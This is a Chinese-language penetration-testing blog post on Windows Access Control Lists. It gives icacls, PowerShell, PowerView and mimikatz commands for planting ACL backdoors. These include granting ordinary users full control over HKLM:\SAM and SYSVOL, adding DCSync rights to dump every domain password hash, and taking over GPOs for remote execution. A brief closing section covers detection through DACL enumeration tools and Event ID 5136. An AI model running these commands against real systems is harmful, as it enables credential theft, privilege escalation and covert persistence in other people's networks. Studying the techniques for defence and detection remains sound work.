---
layout: post
title: 渗透技巧——Windows下的Access Control List
---


## 0x00 前言
---

Windows系统中的ACL(Access Control List)，用来表示用户（组）权限的列表。

在渗透测试中，理解并运用ACL，尤其在后门利用(提权)方面，可供发挥的空间很大。

而站在防御的角度，如果系统被攻破，找到并清除攻击者留下的ACL后门，同样需要对ACL有一定的了解。


## 0x01 简介
---

本文将要介绍以下内容：

- ACL相关概念
- 查看ACL
- ACL利用(文件、注册表和域环境)
- ACL检测


## 0x02 ACL相关概念
---

官方文档：

https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/access-control-lists

#### ACL：

Access Control List，用来表示用户（组）权限的列表，包括DACL和SACL

#### ACE：

Access Control Entry，ACL中的元素

#### DACL：

Discretionary Access Control List，用来表示安全对象权限的列表

#### SACL：

System Access Control List，用来记录对安全对象访问的日志

#### 直观理解：

Windows访问控制模型中会用到ACL，比如文件、注册表的权限都包括ACL，用来表示哪些用户（组）具有操作权限

例如对某个文件进行访问，系统将做以下判断：

- 如果没有DACL，系统将允许访问
- 如果存在DACL，但没有ACE，系统将拒绝所有访问
- 如果存在DACL，也存在ACE，那么会按照每个ACE指定允许或拒绝


### 实例演示

对于文件夹`C:\Windows\SYSVOL\sysvol\test.com`,查看文件夹属性

默认共有五条DACL，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-1.png)

选中一条DACL，其中包含多个ACE，表示具有的权限，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-2.png)

## 0x03 文件中的ACL
---

### 常用命令(icacls)：

#### 1、查看指定文件的ACL

```
icacls C:\Windows\SYSVOL\sysvol\test.com
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/3-1.png)

#### 2、备份指定文件(包括当前目录及其子目录中的文件)的ACL

```
icacls C:\Windows\SYSVOL\sysvol\test.com /save AclFile /t
```

#### 3、还原指定文件(包括当前目录及其子目录中的文件)的ACL

```
icacls C:\Windows\SYSVOL\sysvol\ /restore AclFile /t
```

**注：**

还原时，路径需要设置为上级目录

#### 4、添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限

```
icacls C:\Windows\SYSVOL\sysvol\test.com /grant test1:(OI)(CI)(F) /t
```

**注：**

(OI)代表对象继承
(CI)代表容器继承
(F)代表完全访问

#### 5、移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限

```
icacls C:\Windows\SYSVOL\sysvol\test.com /remove test1 /t
```

### 常用命令(powershell)：

#### 1、查看指定路径的ACL

例如`C:\Windows\SYSVOL\sysvol\test.com`

```
Get-Acl -Path 'C:\Windows\SYSVOL\sysvol\test.com'| Format-Table -wrap
```

#### 2、添加用户test1对指定文件的完全访问权限

```
function Add-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.AddAccessRule($rule)
    Set-Acl $Path $acl
}
Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
```



#### 3、移除用户test1对指定文件的完全访问权限

```
function Remove-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.RemoveAccessRule($rule)
    Set-Acl $Path $acl
}
Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
```


#### 4、添加用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限


```
function Add-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.AddAccessRule($rule)
    Set-Acl $Path $acl
}
Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
Foreach($file in $fileList)
{
    $file.fullname
    Add-ACL -Path $file.fullname
}
```


#### 5、移除用户test1对指定文件(包括当前目录及其子目录中的文件)的完全访问权限

```
function Remove-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.RemoveAccessRule($rule)
    Set-Acl $Path $acl
}
Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
Foreach($file in $fileList)
{
    Remove-ACL -Path $file.fullname
}
```

### 利用思路：

#### 1、本地提权后门

在取得Windows系统的管理员权限后，可以修改系统目录的ACL，添加普通用户的完全访问权限，作为提权后门

后续可以通过dll劫持、文件替换等多种方法从普通用户提升至管理员权限

#### 2、域环境GPO的修改

修改域内共享文件夹`\\<DOMAIN>\SYSVOL\<DOMAIN>\`的ACL，添加普通用户的完全访问权限

后续可以使用域内普通用户的权限修改域环境的GPO，修改GPO的计划任务，实现计划任务的远程执行

相关方法可参考之前的文章[《域渗透——利用GPO中的计划任务实现远程执行》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/)

#### 3、域内普通用户读取域内所有用户hash

创建ntds.dit的文件共享，添加ACL

后续可以使用域内普通用户访问域控制器的ntds.dit文件，读取域内所有用户的hash

## 0x04 注册表中的ACL
---

### 常用命令(powershell)：

#### 1、查看指定路径的ACL

例如`HKEY_LOCAL_MACHINE\SAM`

```
Get-Acl -Path 'HKLM:\SAM'| Format-Table -wrap
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-1.png)

获得Access项的具体内容：

```
$acl = Get-Acl -Path 'HKLM:\SAM'
$acl.Access
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-2.png)

#### 2、添加用户test1对指定路径(包括当前注册表项及其子健)的完全访问权限

```
$acl = Get-Acl HKLM:\SAM
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl HKLM:\SAM $acl
```

**注：**

`$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"`表示其子健继承当前注册表项的权限

修改注册表项`HKLM:\SAM`的ACL需要Administrator权限

修改注册表项`HKLM:\SAM\SAM`的ACL需要System权限

#### 3、移除用户test1对指定路径(包括当前注册表项及其子健)的完全访问权限

```
$acl = Get-Acl HKLM:\SAM
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.RemoveAccessRule($rule)
Set-Acl HKLM:\SAM $acl
```

### 利用思路：

#### 1、本地提权后门

修改注册表项`HKLM:\SAM`和`HKLM:\SYSTEM`，添加普通用户的完全访问权限

普通用户能够通过注册表项获得本地所有用户的hash，进而获得管理员权限

#### 3、本地自启动后门

修改注册表位置，添加启动项或者劫持项

## 0x05 域环境中的ACL
---

通过Active Directory Service Interfaces (ADSI)实现

官方文档：

https://docs.microsoft.com/en-us/windows/desktop/AD/controlling-access-to-objects-in-active-directory-domain-services

Powershell调用ADSI的参考资料：

https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell

### 常用命令(powershell)：

**注：**

PowerView已经实现了这部分内容，所以本节直接引用PowerView中的功能

代码地址：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

#### 1、获得当前域内所有对象

```
Get-DomainObject -Domain test.com
```

#### 2、获得当前域内所有对象的ACL

```
Get-DomainObjectAcl -Domain test.com
```

#### 3、获得指定用户的ACL

```
Get-DomainUser test1
```

#### 4、添加用户test1对指定对象(guid)的完全访问权限

```
Add-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
```

#### 5、移除用户test1对指定对象(guid)的完全访问权限

```
Remove-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
```

### 利用思路：

#### 1、DCSync后门

**注：**

该方法学习自：https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf

DCSync是mimikatz的一个功能，能够模拟域控制器并从域控制器导出帐户密码hash

如果我们在域内一台主机上获得了域管理员权限，可以使用如下命令直接导出域内所有用户的hash：

```
mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
```

导出域内administrator帐户的hash：

```
mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
```

默认情况下，只有`Domain Controllers`和`Enterprise Domain Admins`权限能够使用DCSync

但我们可以对`DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)`和`DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)`添加ACL，这样就能实现普通用户调用DCSync导出域内所有用户的hash

实现代码：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270

添加ACL的命令如下：

```
Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
```

接下来，在域内一台登录了test1用户的主机上面，就能使用mimikatz的DCSync功能

删除ACL的命令如下：

```
Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
```

#### 2、GPO后门

(1)查看当前域内的GPO

```
Import-Module GroupPolicy
Get-GPO -All
```

如下图，`TestGPO`是我在测试环境自己添加的，`Default Domain Policy`和`Default Domain Controllers Policy`是域环境默认存在的GPO

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-3.png)

(2)添加用户test1对TestGPO的完全访问权限

```
$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
```

(3)移除用户test1对TestGPO的完全访问权限

```
$RawObject = Get-DomainGPO -Raw -Identity 'TestGPO'
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity test1 -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
```

后续可以对GPO进行操作，添加计划任务，实现计划任务的远程执行，具体方法可参考之前的文章[《域渗透——利用GPO中的计划任务实现远程执行》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/)

## 0x06 ACL检测
---

#### 1、文件和注册表

可借助开源工具WindowsDACLEnumProject：

https://github.com/nccgroup/WindowsDACLEnumProject

能够列出存在风险的ACL

#### 3、域环境

需要开启高级安全审核策略，参考资料：

https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/

开启策略后，Event ID 5136会记录域环境中ACL的修改，参考资料：

https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=5136

## 0x07 小结
---

本文介绍了Windows系统中的ACL在文件、注册表和域环境下后门利用方面的技巧，并给出检测后门的建议。

我从PowerView中学到了很多域环境下ACL的知识，在此感谢作者的开源。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)







